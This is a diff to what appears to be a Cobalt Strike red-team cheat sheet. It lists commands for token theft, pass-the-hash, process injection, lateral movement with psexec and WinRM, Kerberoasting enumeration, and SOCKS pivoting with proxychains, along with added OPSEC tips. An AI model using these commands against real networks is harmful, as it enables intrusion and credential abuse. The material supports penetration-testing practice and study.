@@ -433,12 +433,15 @@ Cobalt Strike > Script Manger > Load
 /opt/cobaltstrike/third-party/trustedsec-remote-ops/Injection/Injection.cna
 
 - Double-hop problem
+When using WMI or WinRM to execute code, you will receive a token with a network logon type. Creds are not
+sent to the target. You cannot double-hop and execute any additional network connections from this target.
+
 ps                                                   Show process list.
-steal_token <PID>                                    If someone else logged in, steal their token
-inject <PID> <x86|x64> <listener>                    Bad OPSEC, need to use a BOF
+steal_token <PID>                                    Use if someone else logged in
+inject <PID> <x86|x64> <listener>                    Bad OPSEC, use a BOF
 make_token <domain\user> <password>                  Plaintext creds preference
 pth <domain\user> <hash>
-spawnas <domain\user> <password> <listener>          Bad OPSEC, need to use a BOF
+spawnas <domain\user> <password> <listener>          Bad OPSEC, use a BOF
 Use Rubeus to request/apply a new ticket
 kerberos_ticket_use (with an existing ticket)
 
@@ -457,7 +460,7 @@ powerpick Get-NetLocalGroupMember <FQDN*>; "done"    Show users in the local adm
 dir \\<FQDN>\C$\                                     BOF - Check to see if you have access to a remote computer (include the trailing backslash)
 
 If you have access, establish a new Beacon on that host
-jump <psexec, psexec64, psexec_psh, winrm, winrm64> <FQDN> <listener>   Bad OPSEC, need to use a BOF
+jump <psexec, psexec64, psexec_psh, winrm, winrm64> <FQDN> <listener>   Bad OPSEC, use a BOF
 Privesc and dump creds
 
 powerpick Get-DomainUser-SPN -Properties samaccountname, serviceprincipalnaame; "done"
@@ -495,8 +498,11 @@ Where is the person who has control?
 
 # SOCKS proxy
 
+Used to pivot additional traffic and tools into a network.
+
 sleep 0                                              Make a Beacon interactive
-socks <port>                                         Start a SOCKS4a proxy server on the team server (example 8080)
+socks <port>                                         Start a SOCKS4a proxy server on the team server with proxychains (example 8080)
 /etc/proxychains4.conf                               Edit your attack VM’s config at the bottom with the team server IP and proxy port
 proxychains <tool/options>
 proxychains xfreerdp /u:<domain\user> /p:<password> /v:<IP>
+socks stop                                           Stop the proxy
